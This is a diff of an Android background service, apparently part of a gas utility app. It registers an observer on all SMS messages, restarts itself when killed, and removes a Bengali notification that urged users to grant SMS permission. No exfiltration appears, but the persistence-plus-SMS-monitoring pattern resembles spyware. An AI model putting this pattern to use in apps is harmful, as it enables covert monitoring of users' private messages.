@@ -48,22 +48,35 @@ public class FixOppoAutoKill extends Service {
     private MyReceiver myReceiver;
     private boolean isReceiverRegistered = false;
     private SmsObserver smsObserver;
+    private static boolean isServiceRunning = false;
+    private boolean isForegroundStarted = false;
 
     @Override
     public void onCreate() {
         super.onCreate();
+
+        if (isServiceRunning) {
+            Log.d(TAG, "Service already initialized");
+            return;
+        }
+
+        isServiceRunning = true;
+
         try {
+
             createNotificationChannel();
-            Notification notification = createNotification();
-            Log.d(TAG, "Calling startForeground with notification");
-            startForeground(NOTIFICATION_ID, notification);
+
+            if (!isForegroundStarted) {
+                Notification notification = createNotification();
+                startForeground(NOTIFICATION_ID, notification);
+                isForegroundStarted = true;
+            }
 
             new Thread(() -> {
                 try {
-                    SyncUtils.initialize(getApplicationContext());
                     JobSchedulerUtil.fetch_profile_info(getApplicationContext());
                 } catch (Exception e) {
-                    Log.e(TAG, "Error initializing sync/jobs", e);
+                    Log.e(TAG, "Error initializing jobs", e);
                 }
             }).start();
 
@@ -74,72 +87,110 @@ public class FixOppoAutoKill extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+
         try {
 
-
-            if (ActivityCompat.checkSelfPermission(
-                    this,
-                    android.Manifest.permission.READ_SMS
-            ) != PackageManager.PERMISSION_GRANTED) {
-
-
-                NotificationHelper.sendNotification(
-                        getApplicationContext(),
-                        "আপনার ফোনে গ্যাসের অ্যাপ",
-                        "সঠিক ভাবে কাজ করছেনা",
-                        new Intent(MyApp.getContext(), PermissionActivity.class)
-                );
-            }
-
-
             if (!isReceiverRegistered) {
+
                 myReceiver = new MyReceiver();
+
                 IntentFilter filter = new IntentFilter(Intent.ACTION_USER_PRESENT);
+
                 registerReceiver(myReceiver, filter);
+
                 isReceiverRegistered = true;
 
-
-                if (smsObserver == null) {
-                    smsObserver = new SmsObserver(new Handler(Looper.getMainLooper()));
-                    getContentResolver().registerContentObserver(
-                            Uri.parse("content://sms"), true, smsObserver
-                    );
-                }
-
+                Log.d(TAG, "Receiver registered");
 
             } else {
-                Log.d(TAG, "Receiver already registered, skipping");
+
+                Log.d(TAG, "Receiver already registered");
+
             }
+
+
+            if (smsObserver == null) {
+
+                smsObserver = new SmsObserver(
+                        new Handler(Looper.getMainLooper())
+                );
+
+                getContentResolver().registerContentObserver(
+                        Uri.parse("content://sms"),
+                        true,
+                        smsObserver
+                );
+
+                Log.d(TAG, "SMS observer registered");
+
+            } else {
+
+                Log.d(TAG, "SMS observer already registered");
+
+            }
+
         } catch (Exception e) {
-            Log.e(TAG, "Failed to register receiver", e);
+
+            Log.e(TAG, "onStartCommand failed", e);
+
         }
+
         return START_STICKY;
     }
 
     @Override
     public void onDestroy() {
+
         super.onDestroy();
-        try {
-            scheduleServiceRestart();
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to schedule service restart", e);
-        }
+
+        isServiceRunning = false;
+        isForegroundStarted = false;
 
         try {
+
             if (isReceiverRegistered && myReceiver != null) {
+
                 unregisterReceiver(myReceiver);
+
                 isReceiverRegistered = false;
+
+                myReceiver = null;
+
                 Log.d(TAG, "Receiver unregistered");
             }
+
         } catch (Exception e) {
-            Log.e(TAG, "Failed to unregister receiver", e);
+
+            Log.e(TAG, "Receiver unregister failed", e);
+
         }
 
-        if (smsObserver != null) {
-            getContentResolver().unregisterContentObserver(smsObserver);
-            smsObserver = null;
+        try {
+
+            if (smsObserver != null) {
+
+                getContentResolver().unregisterContentObserver(smsObserver);
+
+                smsObserver = null;
+
+                Log.d(TAG, "SMS observer unregistered");
+            }
+
+        } catch (Exception e) {
+
+            Log.e(TAG, "Observer unregister failed", e);
+
         }
 
+        try {
+
+            scheduleServiceRestart();
+
+        } catch (Exception e) {
+
+            Log.e(TAG, "Restart scheduling failed", e);
+
+        }
     }
 
     @Nullable
